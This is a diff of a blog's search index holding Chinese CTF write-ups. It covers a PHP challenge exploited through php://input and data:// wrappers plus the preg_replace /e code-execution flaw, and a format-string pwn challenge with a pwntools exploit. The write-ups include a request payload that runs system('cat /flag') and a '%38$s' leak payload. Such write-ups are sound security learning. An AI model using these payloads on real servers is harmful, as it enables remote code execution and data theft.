@@ -52,60 +52,7 @@
       </categories>
   </entry>
   <entry>
-    <title>BUU-ZJCTF,buguoruci - Wp</title>
-    <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
-    <content><![CDATA[<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>1.使用php:&#x2F;&#x2F;input</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
-</blockquote>
-<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
-<blockquote>
-<p>2.使用data协议</p>
-<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
-</blockquote>
-<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
-<p>next.php的内容</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
-<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
-<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
-<p><a href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
-<blockquote>
-<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
-<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
-</blockquote>
-<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
-<blockquote>
-<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
-<p>\S 匹配任何非空白字符</p>
-</blockquote>
-<p><strong>3.PHP可变变量</strong></p>
-<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
-<blockquote>
-<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
-</blockquote>
-<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BUU-easy_web-Wp</title>
+    <title>BUU-easy_web的Wp</title>
     <url>/CTF/Web/BUU-easy_web/</url>
     <content><![CDATA[<p>打开题目，先抓包看看 -&gt; 两个参数img(base64编码) cmd 图片通过base64编码的格式进行传输.</p>
 <p><img src="/CTF/WEB/BUU-easy_web/00.png" alt="00"></p>
@@ -163,5 +110,131 @@
       <categories>
         <category>Web</category>
       </categories>
+  </entry>
+  <entry>
+    <title>BUU-ZJCTF,不过如此 - Wp</title>
+    <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
+    <content><![CDATA[<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>1.使用php:&#x2F;&#x2F;input</p>
+<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
+<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
+</blockquote>
+<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
+<blockquote>
+<p>2.使用data协议</p>
+<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
+</blockquote>
+<p><img src="/CTF/WEB/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
+<p>next.php的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
+<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
+<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
+<p><a href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
+<blockquote>
+<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
+<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
+</blockquote>
+<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
+<blockquote>
+<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
+<p>\S 匹配任何非空白字符</p>
+</blockquote>
+<p><strong>3.PHP可变变量</strong></p>
+<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
+<blockquote>
+<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
+</blockquote>
+<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/</url>
+    <content><![CDATA[<hr>
+<h2 id="title-HNCTF-2022-Week1-fmtstrre的Wpcategories-Pwn"><a href="#title-HNCTF-2022-Week1-fmtstrre的Wpcategories-Pwn" class="headerlink" title="title:[HNCTF 2022 Week1]fmtstrre的Wpcategories:Pwn"></a>title:[HNCTF 2022 Week1]fmtstrre的Wp<br>categories:Pwn</h2><p>先checksec一下</p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;00.png)</p>
+<p>然后IDA(64)打开</p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;01.png)</p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p>这段代码中需要打开flag这个文件 &#x3D;l&gt; 小技巧</p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p>该如何利用这个漏洞？根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;02.png)</p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;03.png)</p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/Wp/</url>
+    <content><![CDATA[<p>先checksec一下</p>
+<p><img src="/Wp/00.png"></p>
+<p>然后IDA(64)打开</p>
+<p><img src="/Wp/01.png"></p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p>这段代码中需要打开flag这个文件 &#x3D;l&gt; 小技巧</p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p>该如何利用这个漏洞？根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
+<p><img src="/Wp/02.png"></p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
+<p><img src="/Wp/03.png"></p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
 </search>
